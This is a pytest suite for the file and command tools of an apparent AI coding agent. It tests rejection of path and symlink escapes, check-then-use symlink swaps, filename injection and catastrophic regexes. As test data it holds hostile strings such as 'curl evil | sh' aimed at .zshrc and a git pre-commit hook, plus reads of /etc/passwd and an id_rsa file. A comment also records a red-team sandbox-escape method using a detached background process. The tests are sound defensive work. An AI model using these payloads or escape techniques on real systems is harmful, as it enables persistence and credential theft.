import os
import shutil
import threading
import time
from collections.abc import Callable
from pathlib import Path

import pytest
from pydantic import ValidationError

from boxcode.config import Settings
from boxcode.sandbox import NoSandboxRunner
from boxcode.tools import EditFile, Grep, ListDir, ReadFile, RunCommand, ToolContext, ToolError, WriteFile, search
from boxcode.tools import base as tools_base
from boxcode.tools.fs import MAX_FILE_BYTES


@pytest.fixture
def ctx(workspace: Path, settings: Settings) -> ToolContext:
    (workspace / "a.py").write_text("x = 1\ny = 2\n")
    return ToolContext(workspace, NoSandboxRunner(), settings)


def test_read_file_numbers_lines(ctx: ToolContext) -> None:
    out = ReadFile().run(ctx, ReadFile.Params(path="a.py")).text
    assert "    1\tx = 1" in out and "    2\ty = 2" in out


def test_read_file_paging(ctx: ToolContext) -> None:
    (ctx.workspace / "long.txt").write_text("".join(f"line {i}\n" for i in range(1, 11)))
    out = ReadFile().run(ctx, ReadFile.Params(path="long.txt", offset=3, limit=2)).text
    assert "    3\tline 3" in out and "line 5" not in out and "offset=5" in out
    with pytest.raises(ToolError, match="只有 10 行"):
        ReadFile().run(ctx, ReadFile.Params(path="long.txt", offset=50))


def test_read_file_refuses_binary_and_huge(ctx: ToolContext) -> None:
    (ctx.workspace / "img.png").write_bytes(b"\x89PNG\r\n\x00\x00binary")
    with pytest.raises(ToolError, match="二进制"):
        ReadFile().run(ctx, ReadFile.Params(path="img.png"))
    with (ctx.workspace / "big.log").open("wb") as f:
        f.truncate(MAX_FILE_BYTES + 1)
    with pytest.raises(ToolError, match="太大"):
        ReadFile().run(ctx, ReadFile.Params(path="big.log"))


def test_path_escape_rejected(ctx: ToolContext) -> None:
    with pytest.raises(ToolError):
        ReadFile().run(ctx, ReadFile.Params(path="../../etc/passwd"))
    with pytest.raises(ToolError):
        WriteFile().target(ctx, WriteFile.Params(path="/etc/x", content=""))


def test_symlink_escape_rejected(ctx: ToolContext, tmp_path: Path) -> None:
    (tmp_path / "outside.txt").write_text("secret")
    (ctx.workspace / "link.txt").symlink_to(tmp_path / "outside.txt")
    with pytest.raises(ToolError):
        ReadFile().run(ctx, ReadFile.Params(path="link.txt"))


def test_grep_and_list_skip_links_out_of_workspace(ctx: ToolContext, tmp_path: Path) -> None:
    # 沙盒里的命令能建这种链接；文件工具不在沙盒里，跟着链接就会读到工作区外
    (tmp_path / "id_rsa").write_text("SECRET")
    (ctx.workspace / "notes.txt").symlink_to(tmp_path / "id_rsa")
    (ctx.workspace / "inside.txt").symlink_to(ctx.workspace / "a.py")
    hits = Grep().run(ctx, Grep.Params(pattern=".")).text
    assert "SECRET" not in hits and "a.py:1: x = 1" in hits
    listing = ListDir().run(ctx, ListDir.Params()).text
    assert "notes.txt" not in listing and "inside.txt" in listing


def test_list_dir_tree_order_and_skips(ctx: ToolContext) -> None:
    for rel in ("src/b.py", "src/a/c.py", "node_modules/x.js", ".GIT/config", "z.txt"):
        (ctx.workspace / rel).parent.mkdir(parents=True, exist_ok=True)
        (ctx.workspace / rel).write_text("")
    out = ListDir().run(ctx, ListDir.Params()).text.splitlines()
    assert out == ["a.py", "src/", "src/a/", "src/a/c.py", "src/b.py", "z.txt"]
    capped = ListDir().run(ctx, ListDir.Params(max_entries=2)).text.splitlines()
    assert capped[:2] == ["a.py", "src/"] and "已截断" in capped[2]


def test_grep_skips_binary_and_reports_regex_errors(ctx: ToolContext) -> None:
    (ctx.workspace / "blob.bin").write_bytes(b"\x00y = 2")
    assert "blob.bin" not in Grep().run(ctx, Grep.Params(pattern=r"y =")).text
    assert "a.py:2: y = 2" in Grep().run(ctx, Grep.Params(pattern=r"y =")).text
    with pytest.raises(ToolError, match="正则"):
        Grep().run(ctx, Grep.Params(pattern="("))


def test_edit_requires_unique_match(ctx: ToolContext) -> None:
    (ctx.workspace / "b.py").write_text("a\na\n")
    with pytest.raises(ToolError, match="2 次"):
        EditFile().run(ctx, EditFile.Params(path="b.py", old_string="a", new_string="b"))
    with pytest.raises(ToolError, match="没有找到"):
        EditFile().run(ctx, EditFile.Params(path="b.py", old_string="zzz", new_string="b"))
    EditFile().run(ctx, EditFile.Params(path="a.py", old_string="y = 2", new_string="y = 3"))
    assert (ctx.workspace / "a.py").read_text() == "x = 1\ny = 3\n"


def test_edit_keeps_crlf_line_endings(ctx: ToolContext) -> None:
    # 以前 read_text/write_text 会把整个文件的 CRLF 悄悄改成 LF，模型给的 \n 片段也匹配不上
    p = ctx.workspace / "win.py"
    p.write_bytes(b"def f():\r\n    return 1\r\n")
    EditFile().run(ctx, EditFile.Params(path="win.py", old_string="def f():\n    return 1",
                                        new_string="def f():\n    return 2"))
    assert p.read_bytes() == b"def f():\r\n    return 2\r\n"


@pytest.mark.parametrize(("old", "new", "expected"), [
    ("one\ntwo", "ONE\r\nTWO", b"ONE\r\nTWO\r\nthree\r\n"),  # new 里已经是 CRLF：不能变成 \r\r\n
    ("two", "TWO\nMORE", b"one\r\nTWO\r\nMORE\r\nthree\r\n"),  # 单行 old、多行 new：不能混进 LF
])
def test_edit_normalizes_new_string_in_crlf_files(ctx: ToolContext, old: str, new: str, expected: bytes) -> None:
    p = ctx.workspace / "win.txt"
    p.write_bytes(b"one\r\ntwo\r\nthree\r\n")
    EditFile().run(ctx, EditFile.Params(path="win.txt", old_string=old, new_string=new))
    assert p.read_bytes() == expected


def test_edit_refuses_non_utf8(ctx: ToolContext) -> None:
    (ctx.workspace / "latin1.txt").write_bytes(b"caf\xe9")
    with pytest.raises(ToolError, match="UTF-8"):
        EditFile().run(ctx, EditFile.Params(path="latin1.txt", old_string="caf", new_string="x"))


def test_write_file_writes_exact_bytes(ctx: ToolContext) -> None:
    WriteFile().run(ctx, WriteFile.Params(path="new/dir/f.txt", content="a\r\nb\n"))
    assert (ctx.workspace / "new/dir/f.txt").read_bytes() == b"a\r\nb\n"


def test_params_reject_unknown_fields() -> None:
    with pytest.raises(ValidationError, match="extra"):
        RunCommand().parse('{"command": "ls", "timeout": 5}')
    assert RunCommand().parse('{"command": "ls"}').timeout_s == 60
    assert ListDir().parse("").path == "."  # 模型可能给空字符串


def test_run_command_reports_exit_code(ctx: ToolContext) -> None:
    r = RunCommand().run(ctx, RunCommand.Params(command="echo out; echo err >&2; exit 3"))
    assert not r.ok and r.text.startswith("exit code: 3") and "out" in r.text and "err" in r.text


# ---- 检查和打开之间被换成符号链接（红队实测：沙盒里脱离进程组的后台进程一直来回换，文件工具就会跟着链接走）----


@pytest.fixture
def swap_after_check(monkeypatch: pytest.MonkeyPatch) -> Callable[[Path, Path], None]:
    """让 resolve_in_workspace 检查完之后，立刻把 victim 换成指向 target 的链接：模拟最坏的时机。"""

    def install(victim: Path, target: Path) -> None:
        real = tools_base.resolve_in_workspace

        def swapped(workspace: Path, path: str) -> Path:
            p = real(workspace, path)
            if victim.is_dir() and not victim.is_symlink():
                shutil.rmtree(victim)
            else:
                victim.unlink(missing_ok=True)
            victim.symlink_to(target)
            return p

        monkeypatch.setattr(tools_base, "resolve_in_workspace", swapped)

    return install


def test_read_not_redirected_outside(ctx: ToolContext, tmp_path: Path,
                                     swap_after_check: Callable[[Path, Path], None]) -> None:
    (tmp_path / "secret.txt").write_text("SECRET")
    (ctx.workspace / "notes.txt").write_text("plain")
    swap_after_check(ctx.workspace / "notes.txt", tmp_path / "secret.txt")
    with pytest.raises(ToolError, match="符号链接"):
        ReadFile().run(ctx, ReadFile.Params(path="notes.txt"))


def test_write_not_redirected_outside(ctx: ToolContext, tmp_path: Path,
                                      swap_after_check: Callable[[Path, Path], None]) -> None:
    zshrc = tmp_path / ".zshrc"
    zshrc.write_text("original")
    (ctx.workspace / "notes.txt").write_text("plain")
    swap_after_check(ctx.workspace / "notes.txt", zshrc)
    with pytest.raises(ToolError):
        WriteFile().run(ctx, WriteFile.Params(path="notes.txt", content="curl evil | sh"))
    assert zshrc.read_text() == "original"


def test_write_not_redirected_into_git_dir(ctx: ToolContext, swap_after_check: Callable[[Path, Path], None]) -> None:
    (ctx.workspace / ".git" / "hooks").mkdir(parents=True)
    (ctx.workspace / "foo" / "hooks").mkdir(parents=True)
    swap_after_check(ctx.workspace / "foo", ctx.workspace / ".git")  # 中间一级目录被换成指向 .git 的链接
    with pytest.raises(ToolError, match=r"\.git"):
        WriteFile().run(ctx, WriteFile.Params(path="foo/hooks/pre-commit", content="curl evil | sh"))
    assert not (ctx.workspace / ".git" / "hooks" / "pre-commit").exists()


def test_edit_not_redirected_outside(ctx: ToolContext, tmp_path: Path,
                                     swap_after_check: Callable[[Path, Path], None]) -> None:
    outside = tmp_path / "config.py"
    outside.write_text("x = 1\n")
    swap_after_check(ctx.workspace / "a.py", outside)
    with pytest.raises(ToolError):
        EditFile().run(ctx, EditFile.Params(path="a.py", old_string="x = 1", new_string="x = 2"))
    assert outside.read_text() == "x = 1\n"


def test_symlink_loop_does_not_break_listing(ctx: ToolContext) -> None:
    # 沙盒里的命令建一个指向自己的链接，以前 list_dir 和 grep 整个报 RuntimeError
    (ctx.workspace / "zz_loop").symlink_to("zz_loop")
    assert "a.py" in ListDir().run(ctx, ListDir.Params()).text
    assert "a.py:1: x = 1" in Grep().run(ctx, Grep.Params(pattern="x = 1")).text
    with pytest.raises(ToolError):
        ReadFile().run(ctx, ReadFile.Params(path="zz_loop"))


def test_newline_in_filename_is_escaped(ctx: ToolContext) -> None:
    (ctx.workspace / "foo\nINJECTED.txt").write_text("x = 1\n")
    listing = ListDir().run(ctx, ListDir.Params()).text.splitlines()
    assert "INJECTED.txt" not in listing and any("\\n" in line for line in listing)


def test_line_numbers_only_split_on_newline(ctx: ToolContext) -> None:
    # str.splitlines() 还会在 \x0c 这类字符处断行，行号和编辑器、pytest 对不上
    (ctx.workspace / "ff.py").write_text("a = 1\n\x0c\nb = 2\nc = 3\n")
    assert "ff.py:4: c = 3" in Grep().run(ctx, Grep.Params(pattern="c = 3")).text
    assert "    4\tc = 3" in ReadFile().run(ctx, ReadFile.Params(path="ff.py")).text


def test_grep_reports_truncation_only_when_truncated(ctx: ToolContext) -> None:
    (ctx.workspace / "five.txt").write_text("hit\n" * 5)
    exact = Grep().run(ctx, Grep.Params(pattern="hit", path="five.txt", max_results=5)).text
    assert exact.count("hit") == 5 and "截断" not in exact
    assert "截断" in Grep().run(ctx, Grep.Params(pattern="hit", path="five.txt", max_results=4)).text


# ^(a|a)*$ 在一行 "aaa...ab" 上要回溯 2**40 次：以前 grep 卡在这一行，总时间预算和“停止”都要等它算完
CATASTROPHIC = r"^(a|a)*$"
SLOW_LINE = "a" * 40 + "b"


def test_grep_gives_up_on_catastrophic_line(ctx: ToolContext, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(search, "LINE_TIMEOUT_S", 0.2)
    (ctx.workspace / "slow.txt").write_text(f"aaaa\n{SLOW_LINE}\naa\n")
    t0 = time.monotonic()
    out = Grep().run(ctx, Grep.Params(pattern=CATASTROPHIC, path="slow.txt")).text
    assert time.monotonic() - t0 < 5
    # 其他行照常匹配，超时的那一行按没匹配处理，并且告诉模型是哪一行
    assert "slow.txt:1: aaaa" in out and "slow.txt:3: aa" in out and "slow.txt:2:" not in out
    assert "1 行匹配超过 0.2 秒" in out and "slow.txt:2" in out


def test_grep_time_budget_covers_slow_lines(ctx: ToolContext, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(search, "TIME_BUDGET_S", 1)
    (ctx.workspace / "slow.txt").write_text(f"{SLOW_LINE}\n" * 20)  # 每行 1 秒，一共要 20 秒
    t0 = time.monotonic()
    out = Grep().run(ctx, Grep.Params(pattern=CATASTROPHIC, path="slow.txt")).text
    assert time.monotonic() - t0 < 4 and "结果不完整" in out


def test_stop_interrupts_grep_inside_a_line(ctx: ToolContext) -> None:
    (ctx.workspace / "slow.txt").write_text(f"{SLOW_LINE}\n" * 20)
    out: list[str] = []
    worker = threading.Thread(target=lambda: out.append(
        Grep().run(ctx, Grep.Params(pattern=CATASTROPHIC, path="slow.txt")).text))
    worker.start()
    # 匹配时要释放 GIL：re 一直占着，桌面界面的线程（包括“停止”按钮）在这一行算完之前都动不了
    start = last = time.monotonic()
    longest_gap = 0.0
    while last - start < 0.5:
        time.sleep(0.01)
        now = time.monotonic()
        longest_gap, last = max(longest_gap, now - last), now
    stopped_at = time.monotonic()
    ctx.cancel.set()
    worker.join(10)
    assert not worker.is_alive() and time.monotonic() - stopped_at < 3
    assert "被停止" in out[0] and longest_gap < 0.3


def test_read_refuses_fifo(ctx: ToolContext) -> None:
    os.mkfifo(ctx.workspace / "pipe")  # 以前打开 FIFO 读会一直卡住
    with pytest.raises(ToolError, match="普通文件"):
        ReadFile().run(ctx, ReadFile.Params(path="pipe"))
